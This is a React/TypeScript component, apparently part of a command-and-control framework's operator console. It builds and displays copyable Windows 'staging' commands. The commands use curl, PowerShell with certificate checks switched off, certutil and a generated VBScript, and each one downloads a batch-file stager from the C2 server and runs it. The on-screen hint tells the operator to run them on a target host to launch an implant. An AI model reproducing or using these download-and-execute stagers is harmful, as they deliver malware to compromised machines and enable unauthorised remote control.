import { useState } from 'react';

interface Props {
  listenerId?: string;
}

interface CommandItem {
  label: string;
  command: string;
}

function buildCommands(serverUrl: string, listenerId: string): CommandItem[] {
  const url = `${serverUrl}/ctv/${listenerId}`;
  return [
    {
      label: 'curl',
      command: `curl -k --max-time 10 ${url} -o %public%\\run.bat && %public%\\run.bat`,
    },
    {
      label: 'PowerShell iwr',
      command: `powershell "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};try{iwr ${url} -OutFile C:\\Users\\Public\\run.bat -TimeoutSec 10;Start-Process C:\\Users\\Public\\run.bat}catch{}"`,
    },
    {
      label: 'certutil',
      command: `certutil.exe -urlcache -split -f ${url} C:\\Users\\Public\\run.bat && C:\\Users\\Public\\run.bat`,
    },
    {
      label: 'cscript js',
      command: `echo Set x=CreateObject("MSXML3.XMLHTTP"):x.open "GET","${url}",False:x.setRequestOption 13,13056:x.send:set a=CreateObject("ADODB.Stream"):a.Mode=3:a.Type=1:a.Open:a.Write x.responseBody:a.SaveToFile "C:\\Users\\Public\\run.bat",2>a.vbs&&cscript //nologo a.vbs&&del a.vbs&&C:\\Users\\Public\\run.bat`,
    },
  ];
}

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);

  async function handleCopy(e: React.MouseEvent) {
    e.stopPropagation();
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      const textarea = document.createElement('textarea');
      textarea.value = text;
      textarea.style.position = 'fixed';
      textarea.style.opacity = '0';
      document.body.appendChild(textarea);
      textarea.select();
      document.execCommand('copy');
      document.body.removeChild(textarea);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  }

  return (
    <button className="btn btn-xs btn-primary stager-copy-btn" onClick={handleCopy}>
      {copied ? '✓ 已复制' : '📋 复制'}
    </button>
  );
}

export default function StagerPanel({ listenerId }: Props) {
  const [expanded, setExpanded] = useState(false);
  const [activeTab, setActiveTab] = useState<'windows' | 'linux'>('windows');

  const serverUrl = window.location.origin;
  const commands = listenerId ? buildCommands(serverUrl, listenerId) : [];

  return (
    <div className="stager-panel">
      <div
        className="stager-header"
        onClick={() => setExpanded(!expanded)}
        role="button"
        tabIndex={0}
        onKeyDown={(e) => { if (e.key === 'Enter' || e.key === ' ') setExpanded(!expanded); }}
      >
        <span className="stager-arrow">{expanded ? '▼' : '▶'}</span>
        <span className="stager-title">命令上线方式 (Command Staging)</span>
      </div>

      {expanded && (
        <div className="stager-content">
          {/* Platform tabs */}
          <div className="stager-tabs">
            <button
              className={`stager-tab ${activeTab === 'windows' ? 'active' : ''}`}
              onClick={(e) => { e.stopPropagation(); setActiveTab('windows'); }}
            >
              Windows
            </button>
            <button
              className="stager-tab disabled"
              disabled
              onClick={(e) => e.stopPropagation()}
              title="暂不支持"
            >
              Linux (暂不支持)
            </button>
          </div>

          {/* Windows content */}
          {activeTab === 'windows' && (
            <div className="stager-tab-content">
              {!listenerId ? (
                <p className="text-muted" style={{ fontSize: '0.85rem' }}>
                  当前 agent 未关联 listener，无法生成上线命令。
                </p>
              ) : (
                <>
                  <p className="stager-hint">
                    在目标 Windows 主机上执行以下任一命令，将自动下载 stager 并运行 implant：
                  </p>
                  {commands.map((cmd) => (
                    <div key={cmd.label} className="stager-command-group">
                      <div className="stager-command-header">
                        <span className="stager-command-label">{cmd.label}</span>
                        <CopyButton text={cmd.command} />
                      </div>
                      <div className="stager-code-block">
                        <code className="stager-code">{cmd.command}</code>
                      </div>
                    </div>
                  ))}
                </>
              )}
            </div>
          )}

          {/* Linux placeholder */}
          {activeTab === 'linux' && (
            <div className="stager-tab-content">
              <p className="text-muted" style={{ fontSize: '0.85rem', padding: '16px 0' }}>
                Linux 上线方式暂未实现，敬请期待。
              </p>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
